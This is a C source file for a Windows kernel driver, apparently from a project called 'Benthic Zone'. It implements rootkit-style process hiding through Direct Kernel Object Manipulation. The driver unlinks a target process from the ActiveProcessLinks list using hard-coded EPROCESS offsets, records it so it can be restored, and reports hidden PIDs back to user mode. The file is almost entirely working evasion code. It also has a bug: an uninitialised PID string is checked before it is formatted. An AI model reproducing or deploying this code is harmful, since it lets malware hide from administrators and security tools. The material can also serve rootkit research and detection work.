// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/
// This header declares functions to handle strings safely (copy, format, concatenate, etc.) and avoid buffer overflows
#include <ntstrsafe.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "../Utils/Utils00Resources.h"
#include "DirectKernelObjectManipulation.h"



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Internal structure to maintain hidden process metadata (kernel-level)
**/
typedef struct _STRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY {
	ULONG Pid;
	PLIST_ENTRY ProcessListEntry;
	PLIST_ENTRY OriginalFlink;
	PLIST_ENTRY OriginalBlink;
	struct _STRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY* Next;
} STRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY, *PSTRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY;



// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------
// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------



// Tag
#define MACRO_DKOMHIDEUNHIDEPROCESS_POOL_TAG 'DHUP'



// START -> GLOBALS ---------------------------------------------------------------------------------------------------------------------------
// START -> GLOBALS ---------------------------------------------------------------------------------------------------------------------------



// Offsets used to access EPROCESS fields (may vary per build)
ULONG_PTR Global_DirectKernelObjectManipulation_ActiveProcessLinksOffset = 0x1D8;
ULONG_PTR Global_DirectKernelObjectManipulation_UniqueProcessIdOffset = 0x1D0;

// Head of the linked list of hidden processes
PSTRUCTURE_UTILSRESOURCES_GENERIC_ENTRY Global_DirectKernelObjectManipulation_HiddenProcessesListHead = NULL;

// Counter for number of hidden processes
ULONG Global_DirectKernelObjectManipulation_HiddenProcessesListCount = 0;

// Internal kernel-only list to track DKOM-hidden processes.
PSTRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY Global_DirectKernelObjectManipulation_HiddenProcessesListKernel = NULL;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Hides a process by unlinking it from the ActiveProcessLinks list.


	@param[in]      pid                                         The process ID to hide.


	@return         TRUE if the process was successfully hidden, FALSE otherwise.
**/
BOOLEAN
TechniquesDirectKernelObjectManipulation_RealHide(
	_In_            ULONG                                       pid
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Get the current process and its list head

	// The IoGetCurrentProcess routine returns a pointer to the current process. Call PsGetCurrentProcess instead of IoGetCurrentProcess.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentprocess
	PEPROCESS currentProcess = PsGetCurrentProcess();
	PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)currentProcess + Global_DirectKernelObjectManipulation_ActiveProcessLinksOffset);
	PLIST_ENTRY head = listEntry;


	// ---------------------------------------------------------------------------------------------------------------------
	// Traverse ActiveProcessLinks
	do {

		// -----------------------------------------------------------------------------------------------------------------
		// Get the base EPROCESS of the current list node
		PEPROCESS entryProcess = (PEPROCESS)((PUCHAR)listEntry - Global_DirectKernelObjectManipulation_ActiveProcessLinksOffset);


		// -----------------------------------------------------------------------------------------------------------------
		// Extract PID from EPROCESS->UniqueProcessId
		ULONG entryPid = *(ULONG *)((PUCHAR)entryProcess + Global_DirectKernelObjectManipulation_UniqueProcessIdOffset);


		// -----------------------------------------------------------------------------------------------------------------
		// This is the process we want to hide
		if (entryPid == pid)
		{

			// -------------------------------------------------------------------------------------------------------------
			// The ExAllocatePool2 routine allocates pool memory of the specified type and returns a pointer to the allocated block.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepool2

			// Allocate memory for our hidden process entry
			PSTRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY hidden = (PSTRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(STRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY), MACRO_DKOMHIDEUNHIDEPROCESS_POOL_TAG);

			// Failed
			if (!hidden)
			{
				// Failed to allocate memory for internal hidden process entry
				DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (RealHide) - ERROR: Failed to allocate memory for PID %lu\n", pid);
				return FALSE;
			}


			// -------------------------------------------------------------------------------------------------------------
			// Save relevant process state before unlinking
			hidden->Pid = pid;
			hidden->ProcessListEntry = listEntry;
			hidden->OriginalFlink = listEntry->Flink;
			hidden->OriginalBlink = listEntry->Blink;


			// -------------------------------------------------------------------------------------------------------------
			// Save to internal kernel list
			hidden->Next = Global_DirectKernelObjectManipulation_HiddenProcessesListKernel;
			Global_DirectKernelObjectManipulation_HiddenProcessesListKernel = hidden;


			// -------------------------------------------------------------------------------------------------------------
			// Unlink process from ActiveProcessLinks
			listEntry->Blink->Flink = listEntry->Flink;
			listEntry->Flink->Blink = listEntry->Blink;


			// -------------------------------------------------------------------------------------------------------------
			// Self-reference current node to avoid dangling pointers and ensure stability
			listEntry->Blink = (PLIST_ENTRY)&listEntry->Flink;
			listEntry->Flink = (PLIST_ENTRY)&listEntry->Flink;


			// -------------------------------------------------------------------------------------------------------------
			// Success
			DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (RealHide) - Process with PID %lu successfully hidden via Direct Kernel Object Manipulation\n", pid);


			// -------------------------------------------------------------------------------------------------------------
			// Return
			return TRUE;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Continue traversal
		listEntry = listEntry->Flink;

	} while (listEntry != head);


	// ---------------------------------------------------------------------------------------------------------------------
	// Process not found
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (RealHide) - No matching process found for PID %lu\n", pid);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return FALSE;
}



/**
	@brief          Restores a previously hidden process by its PID.


	@param[in]      pid                                         The PID of the hidden process.


	@return         TRUE if restored correctly, FALSE if not found or invalid.
**/
BOOLEAN TechniquesDirectKernelObjectManipulation_RealUnhide(
	_In_            ULONG                                       pid
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	PSTRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY prev = NULL;
	PSTRUCTURE_DIRECTKERNELOBJECTMANIPULATION_HIDDEN_PROCESS_ENTRY current = Global_DirectKernelObjectManipulation_HiddenProcessesListKernel;


	// ---------------------------------------------------------------------------------------------------------------------
	// Traverse internal hidden process list to find matching PID
	while (current)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// This is the process we want to unhide
		if (current->Pid == pid)
		{

			// -------------------------------------------------------------------------------------------------------------
			// Validate memory addresses before manipulating kernel pointers
			if (!current->ProcessListEntry || !MmIsAddressValid(current->ProcessListEntry) || !MmIsAddressValid(current->OriginalBlink) || !MmIsAddressValid(current->OriginalFlink))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (RealUnhide) - Invalid pointers while restoring PID %lu\n", pid);
				return FALSE;
			}


			// -------------------------------------------------------------------------------------------------------------
			// Restore the process to its original position in the doubly linked list
			current->OriginalBlink->Flink = current->ProcessListEntry;
			current->OriginalFlink->Blink = current->ProcessListEntry;
			current->ProcessListEntry->Blink = current->OriginalBlink;
			current->ProcessListEntry->Flink = current->OriginalFlink;


			// -------------------------------------------------------------------------------------------------------------
			// Remove from internal hidden process list
			if (prev)
			{
				prev->Next = current->Next;
			}
			else
			{
				Global_DirectKernelObjectManipulation_HiddenProcessesListKernel = current->Next;
			}


			// -------------------------------------------------------------------------------------------------------------
			// Log
			DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (RealUnhide) - Restored process with PID %lu\n", pid);


			// -------------------------------------------------------------------------------------------------------------
			// Cleanup

			// The ExFreePoolWithTag routine deallocates a block of pool memory allocated with the specified tag.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exfreepoolwithtag
			ExFreePoolWithTag(current, MACRO_DKOMHIDEUNHIDEPROCESS_POOL_TAG);

			return TRUE;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Move to next entry
		prev = current;
		current = current->Next;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Process not found
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (RealUnhide) - No matching process found for PID %lu\n", pid);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return FALSE;
}



/**
	@brief          Wrapper that hides a process using Direct Kernel Object Manipulation technique.


	@param[out]     responseBuffer                              Output message buffer.

	@param[in]      responseBufferSize                          Size of the buffer.

	@param[in]      pid                                         The PID of the process to hide.


	@return         A NTSTATUS value indicating success or an error code if the process could not be hidden.
**/
NTSTATUS TechniquesDirectKernelObjectManipulation_Hide(
	_Out_           char*                                       responseBuffer,
	_In_            size_t                                      responseBufferSize,
	_In_            ULONG                                       pid
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	CHAR pidStr[32];


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (Hide) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the resource is already present in the tracking list
	if (UtilsResources_IsPresent(Global_DirectKernelObjectManipulation_HiddenProcessesListHead, STRUCTURE_UTILSRESOURCES_TYPE_PROCESS, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, pidStr))
	{
		// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Process is already hidden.");
		return STATUS_ALREADY_REGISTERED;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Format PID as string for resource management

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(pidStr, sizeof(pidStr), "%lu", pid);


	// ---------------------------------------------------------------------------------------------------------------------
	// Apply Direct Kernel Object Manipulation technique
	if (!TechniquesDirectKernelObjectManipulation_RealHide(pid))
	{
		// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to hide process.");
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Add to resource list
	if (!UtilsResources_Add(&Global_DirectKernelObjectManipulation_HiddenProcessesListHead, &Global_DirectKernelObjectManipulation_HiddenProcessesListCount, STRUCTURE_UTILSRESOURCES_TYPE_PROCESS, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, pidStr))
	{
		// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to add hidden process.");
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Inform user-space that the process was successfully hidden

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Process %lu hidden.", pid);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (Hide) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Wrapper that restores a hidden process using index in resource list.


	@param[out]     responseBuffer                              Output message buffer.

	@param[in]      responseBufferSize                          Size of the buffer.

	@param[in]      index                                       Index of the hidden process to restore.


	@return         A NTSTATUS value indicating success or an error code if the process could not be restored.
**/
NTSTATUS TechniquesDirectKernelObjectManipulation_Unhide(
	_Out_           char*                                       responseBuffer,
	_In_            size_t                                      responseBufferSize,
	_In_            ULONG                                       index
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (Unhide) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve the identifier (PID) from the resource list using the provided index
	CHAR pidStr[32];
	if (!UtilsResources_GetIdentifierByIndex(Global_DirectKernelObjectManipulation_HiddenProcessesListHead, index, pidStr, sizeof(pidStr)))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "No process found for index %lu.", index);
		return STATUS_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Convert the PID string to a numeric value
	ULONG pid;
	if (!NT_SUCCESS(RtlCharToInteger(pidStr, 10, &pid)))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Invalid PID format for index %lu.", index);
		return STATUS_INVALID_PARAMETER;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Unlink from DKOM internal list
	if (!TechniquesDirectKernelObjectManipulation_RealUnhide(pid))
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Write failure message into the response buffer, indicating the DKOM restoration failed

		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Failed to restore process at index %lu.", index);
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Remove from list
	if (!UtilsResources_Remove(&Global_DirectKernelObjectManipulation_HiddenProcessesListHead, &Global_DirectKernelObjectManipulation_HiddenProcessesListCount, index))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Failed to remove process entry at index %lu.", index);
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Confirm success to user-space

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Process at index %lu unhidden.", index);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/DirectKernelObjectManipulation.c] (Unhide) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Lists all processes currently hidden via Direct Kernel Object Manipulation technique.


	@param[out]     responseBuffer                              Output buffer to fill.

	@param[in]      responseBufferSize                          Size of the output buffer.


	@return         A NTSTATUS value indicating success or an error code if the list was truncated.
**/
NTSTATUS TechniquesDirectKernelObjectManipulation_List(
	_Out_           char*                                       responseBuffer,
	_In_            size_t                                      responseBufferSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the list is empty
	if (!Global_DirectKernelObjectManipulation_HiddenProcessesListHead)
	{
		// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "No hidden processes found.");
		return STATUS_SUCCESS;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Dump hidden processes into the response buffer
	return UtilsResources_List(Global_DirectKernelObjectManipulation_HiddenProcessesListHead, responseBuffer, responseBufferSize);
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
